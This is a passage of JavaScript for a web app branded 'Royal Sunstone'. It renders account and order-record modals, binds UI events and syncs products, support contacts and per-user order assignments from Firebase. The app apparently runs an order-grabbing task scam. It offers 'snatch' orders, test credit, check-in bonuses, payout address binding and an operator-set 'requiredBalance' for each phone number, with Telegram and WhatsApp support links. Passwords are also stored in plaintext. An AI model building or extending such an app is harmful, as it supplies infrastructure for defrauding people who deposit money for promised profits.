          <div style="font-size:12px; color:#4b5563;">Daily Profit</div>
          <div style="font-size:17px; font-weight:700;">${profit.toFixed(2)}</div>
        </div>
        <div>
          <div style="font-size:12px; color:#4b5563;">Out of funds</div>
          <div style="font-size:17px; font-weight:700;">${outAmt.toFixed(2)}</div>
        </div>
        <div>
          <div style="font-size:12px; color:#4b5563;">Current Digging Order</div>
          <div style="font-size:17px; font-weight:700;">${state.completedStep} / ${state.targetCount}</div>
        </div>
        <div>
          <div style="font-size:12px; color:#4b5563;">Test Credit</div>
          <div style="font-size:17px; font-weight:700;">${creditAmt.toLocaleString("en-US", { minimumFractionDigits: 2 })}</div>
        </div>
      </div>
      <button type="button" class="btn btn-navy" id="accCloseBtn" style="width:100%; padding:13px; font-size:15px;">Close</button>
    </div>
  `);
  document.getElementById("accCloseBtn")?.addEventListener("click", closeModal);
}

function openOrderRecordModal() {
  const rows = state.orders.length
    ? state.orders
        .map(
          (o) => `
            <div style="border:1px solid #e5e7eb; border-radius:8px; padding:10px; margin-bottom:8px; background:#faf8f5;">
              <div style="font-weight:700; font-size:13px;">#${escapeHtml(o.step)} ${escapeHtml(o.itemName)}</div>
              <div style="font-size:12px; color:#4b5563;">Confirmed &bull; Profit: +৳${roundMoney(o.reward).toFixed(2)}</div>
            </div>
          `
        )
        .join("")
    : `<p style="font-size:13px; color:#6b7280;">No order records yet.</p>`;

  openModal(`
    <div style="background:#cbd5e1; padding:16px 20px; display:flex; justify-content:space-between; align-items:center;">
      <h3 style="font-size:19px; font-weight:700; margin:0 auto;">Order Record</h3>
      <button type="button" id="modalCloseX" style="background:none; border:none; font-size:22px; cursor:pointer;">&times;</button>
    </div>
    <div style="padding:20px; max-height:360px; overflow-y:auto;">
      ${rows}
      <button type="button" class="btn btn-navy" id="recCloseBtn" style="width:100%; margin-top:10px;">Close</button>
    </div>
  `);
  document.getElementById("recCloseBtn")?.addEventListener("click", closeModal);
}

function handleLogoutAction() {
  saveLocal();
  resetGuestViewState();
  switchToMainPage();
  saveLocal();
  renderTopAndDrawer();
  showToast("Logged out.");
}

function bindEvents() {
  if (bindEvents._bound) return;
  bindEvents._bound = true;

  loadLocal();

  const drawer = document.getElementById("sideDrawer");
  const backdrop = document.getElementById("drawerBackdrop");
  const openDrawer = () => {
    drawer?.classList.add("open");
    backdrop?.classList.add("open");
  };
  const closeDrawer = () => {
    drawer?.classList.remove("open");
    backdrop?.classList.remove("open");
  };

  document.getElementById("menu3LineBtn")?.addEventListener("click", openDrawer);
  document.getElementById("snatchPageMenuBtn")?.addEventListener("click", openDrawer);
  document.getElementById("closeDrawerBtn")?.addEventListener("click", closeDrawer);
  backdrop?.addEventListener("click", closeDrawer);

  document.getElementById("backToStoreBtn")?.addEventListener("click", switchToMainPage);
  document.getElementById("brandHomeBtn")?.addEventListener("click", switchToMainPage);

  document.getElementById("heroShopNowBtn")?.addEventListener("click", () => {
    document.getElementById("craftedSection")?.scrollIntoView({ behavior: "smooth" });
  });
  document.getElementById("heroScrollDownBtn")?.addEventListener("click", () => {
    document.getElementById("craftedSection")?.scrollIntoView({ behavior: "smooth" });
  });

  document.querySelectorAll(".top-cat-nav [data-cat]").forEach((btn) => {
    btn.addEventListener("click", () => {
      state.selectedCategory = btn.dataset.cat || "All";
      renderMainSections();
      document.getElementById("craftedSection")?.scrollIntoView({ behavior: "smooth" });
    });
  });

  document.querySelectorAll("[data-filter-scroll]").forEach((btn) => {
    btn.addEventListener("click", () => {
      state.selectedCategory = btn.dataset.filterScroll || "All";
      renderMainSections();
      document.getElementById("craftedSection")?.scrollIntoView({ behavior: "smooth" });
    });
  });

  document.getElementById("prevSlideBtn")?.addEventListener("click", () => {
    state.slideIndex = (state.slideIndex - 1 + EXCLUSIVE_SLIDES.length) % EXCLUSIVE_SLIDES.length;
    renderMainSections();
  });
  document.getElementById("nextSlideBtn")?.addEventListener("click", () => {
    state.slideIndex = (state.slideIndex + 1) % EXCLUSIVE_SLIDES.length;
    renderMainSections();
  });
  document.querySelectorAll(".carousel-dot").forEach((dot) => {
    dot.addEventListener("click", () => {
      state.slideIndex = Number(dot.dataset.slide || 0);
      renderMainSections();
    });
  });

  const requireLogin = (fn) => {
    if (!state.session.loggedIn) {
      openPhoneAuthModal();
      return;
    }
    fn();
  };

  document.getElementById("topAuthBtn")?.addEventListener("click", () => {
    if (state.session.loggedIn) {
      handleLogoutAction();
    } else {
      openPhoneAuthModal();
    }
  });

  document.getElementById("topSnatchBtn")?.addEventListener("click", () => requireLogin(() => switchToSnatchPage("queue")));
  document.getElementById("navSnatchOrdersBtn")?.addEventListener("click", () => requireLogin(() => switchToSnatchPage("queue")));
  document.getElementById("footerSnatchLink")?.addEventListener("click", () => requireLogin(() => switchToSnatchPage("queue")));

  document.getElementById("headerContactBtn")?.addEventListener("click", () => switchToSnatchPage("contact"));
  document.getElementById("navContactUsBtn")?.addEventListener("click", () => switchToSnatchPage("contact"));
  document.getElementById("footerContactLink")?.addEventListener("click", () => switchToSnatchPage("contact"));

  document.getElementById("drawerBuyInBtn")?.addEventListener("click", () => {
    closeDrawer();
    requireLogin(() => switchToSnatchPage("queue"));
  });
  document.getElementById("drawerPayOutTile")?.addEventListener("click", () => {
    closeDrawer();
    requireLogin(() => switchToSnatchPage("payout"));
  });
  document.getElementById("drawerContactTile")?.addEventListener("click", () => {
    closeDrawer();
    switchToSnatchPage("contact");
  });
  document.getElementById("drawerAccountTile")?.addEventListener("click", () => {
    closeDrawer();
    requireLogin(() => openAccountDetailsModal());
  });

  document.querySelectorAll(".menu-row-btn[data-acc]").forEach((row) => {
    row.addEventListener("click", () => {
      document.getElementById(`acc-${row.dataset.acc}`)?.classList.toggle("open");
    });
  });

  document.getElementById("bindAccountForm")?.addEventListener("submit", (e) => {
    e.preventDefault();
    state.session.bindMethod = document.getElementById("bindMethod").value;
    state.session.bindAddress = document.getElementById("bindAddress").value.trim();
    addHistory(`Bound ${state.session.bindMethod}: ${state.session.bindAddress}`);
    saveLocal();
    renderTopAndDrawer();
    if (state.pageMode === "snatch") renderSnatchDedicatedPage();
    showToast("Collection address saved.");
  });

  document.getElementById("checkInBtn")?.addEventListener("click", () => {
    state.session.balance = roundMoney(Number(state.session.balance || 0) + 10);
    addHistory("Check In +৳10.00");
    saveLocal();
    renderTopAndDrawer();
    showToast("Daily check-in claimed (+৳10.00)");
  });

  document.getElementById("changePassForm")?.addEventListener("submit", (e) => {
    e.preventDefault();
    const p = document.getElementById("newPassField").value;
    if (state.session.fullPhone && state.userProfilesMap[state.session.fullPhone]) {
      state.userProfilesMap[state.session.fullPhone].password = p;
    }
    e.target.reset();
    addHistory("Password changed");
    saveLocal();
    showToast("Password updated.");
  });

  document.getElementById("drawerSignOutBtn")?.addEventListener("click", () => {
    closeDrawer();
    handleLogoutAction();
  });

  document.getElementById("newsletterForm")?.addEventListener("submit", (e) => {
    e.preventDefault();
    const email = document.getElementById("newsletterEmail").value.trim();
    if (!email) return;
    e.target.reset();
    showToast("Subscribed to Royal Sunstone updates.");
    push(ref(db, "newsletter"), { email, at: new Date().toISOString() }).catch(() => {});
  });

  document.getElementById("appModal")?.addEventListener("click", (e) => {
    if (e.target.id === "appModal") closeModal();
  });
}

export function renderAllViews() {
  bindEvents();
  renderTopAndDrawer();
  renderMainSections();
  if (state.pageMode === "snatch") renderSnatchDedicatedPage();
}

export function initChatListener() {}

export function initFirebaseSync() {
  try {
    onValue(ref(db, "support_config"), (snap) => {
      if (!snap.exists()) return;
      const cfg = snap.val();
      state.supportConfig = {
        telegramUrl: cfg.telegramUrl || state.supportConfig.telegramUrl,
        whatsappNumber: cfg.whatsappNumber || state.supportConfig.whatsappNumber
      };
      saveLocal();
      if (state.pageMode === "snatch" && state.snatchSubMode === "contact") {
        renderSnatchDedicatedPage();
      }
    });

    onValue(ref(db, "products"), (snap) => {
      if (!snap.exists()) return;
      const raw = snap.val();
      const list = Array.isArray(raw)
        ? raw.filter(Boolean)
        : Object.entries(raw).map(([id, item]) => ({ id, ...item }));
      if (list.length > 0) {
        state.products = list;
        applyUserOrderAssignment();
        saveLocal();
        renderMainSections();
        if (state.pageMode === "snatch") renderSnatchDedicatedPage();
      }
    });

    onValue(ref(db, "user_order_assignments"), (snap) => {
      if (!snap.exists()) return;
      const raw = snap.val();
      const map = {};
      Object.entries(raw).forEach(([key, val]) => {
        if (!val) return;
        const cleanKey = normalizePhone(val.phone || key);
        if (cleanKey) {
          map[cleanKey] = {
            phone: cleanKey,
            orderCount: Math.max(1, Number(val.orderCount || DEFAULT_BATCH_COUNT)),
            totalProfit: roundMoney(val.totalProfit ?? DEFAULT_BATCH_PROFIT),
            requiredBalance: roundMoney(val.requiredBalance || 0),
            updatedAt: val.updatedAt || ""
          };
        }
      });
      state.assignedOrdersMap = map;
      applyUserOrderAssignment();
      saveLocal();
      renderTopAndDrawer();
      if (state.pageMode === "snatch") renderSnatchDedicatedPage();
    });
  } catch (_) {}
}